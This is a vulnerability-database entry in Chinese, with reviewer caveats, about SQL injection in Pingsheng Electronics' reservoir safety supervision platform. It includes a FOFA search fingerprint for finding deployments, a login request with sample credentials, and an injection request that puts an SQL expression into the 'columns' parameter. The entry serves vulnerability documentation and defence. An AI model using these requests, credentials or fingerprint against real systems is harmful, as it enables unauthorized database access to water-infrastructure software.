---
source: "wy876 漏洞文库"
title: "平升电子水库安全监管平台 GetRecordsByTableNameAndColumns动态SQL查询"
product: "平升电子水库安全监管平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server；产品版本未知"
prerequisites: "先Data86凭据登录获取loginIdentifer"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pq90gr1d4fdx1r82"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B9%B3%E5%8D%87%E7%94%B5%E5%AD%90%E6%B0%B4%E5%88%A9/%E5%B9%B3%E5%8D%87%E7%94%B5%E5%AD%90%E6%B0%B4%E5%BA%93%E5%AE%89%E5%85%A8%E7%9B%91%E7%AE%A1%E5%B9%B3%E5%8F%B0GetRecordsByTableNameAndColumns%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"js/PSExtend.js\""
fofa_unverified: "body="
id: "vw-ed9e1c832dc61719e1f19cc3"
entity_id: "ve-ed9e1c832dc61719e1f19cc3"
schema_version: "1"
---

# 平升电子水库安全监管平台 GetRecordsByTableNameAndColumns动态SQL查询

## 条目说明

- 对象与具体问题：平升电子水库安全监管平台；GetRecordsByTableNameAndColumns动态SQL查询
- 版本、配置及部署条件：SQL Server；产品版本未知
- 认证与权限前提：先Data86凭据登录获取loginIdentifer
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 不是无认证，依赖示例账号有效；账号是否默认或硬编码未证
- tableName syscolumns及columns完整SQL表达式可能为高权限通用查询功能，需权限设计边界和非授权角色对照
- 缺登录Guid返回和MD5实际响应；固定Guid不可通用，Content-Length与正文不符
- 最小权限白名单标识符/列表达式比泛预编译建议更合适，补版本/补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
唐山平升电子技术开发有限公司于1999年成立，位于唐山市国家高新技术开发区，是河北省高科技企业，是国内最早生产GPRS数据传输模块的企业之一，专注水行业远程测控设备和系统软件的专业制造商。公司自成立以来，始终致力于供水、水资源远程测控新技术、新产品的开发生产，其中GPRS数据传输模块应用到青藏铁路、大庆油田、曹妃甸工业区等许多国家重点工程和大型企业；水源井远程测控终端通过了国家权威机构的检验、获得国家专利、批量应用到浙江、山西、山东、辽宁、江苏、河南、河北、内蒙、陕西、北京、天津、唐山等许多地区的水务部门，成为行业中的名牌产品。平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限 。

## 二、影响版本
+ 平升电子水库安全监管平台

## 三、资产测绘
+ fofa`body="js/PSExtend.js"`
+ 特征


## 四、漏洞复现
首先获取Guid

```http
POST /Webservices/UserAdminService.asmx/Login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close

LoginName=Data86&LoginPwd=Data86%40
```

> 请求长度说明：原资料 Content-Length 为 35；保留原始标头；其数值未据实际请求体重新计算或验证。


替换获取的Guid发送数据包

```http
POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 105
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Connection: close

loginIdentifer=07deec48-6ee8-4127-9b27-fda9ae2036f9&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
```

> 请求长度说明：原资料 Content-Length 为 105；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pq90gr1d4fdx1r82>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
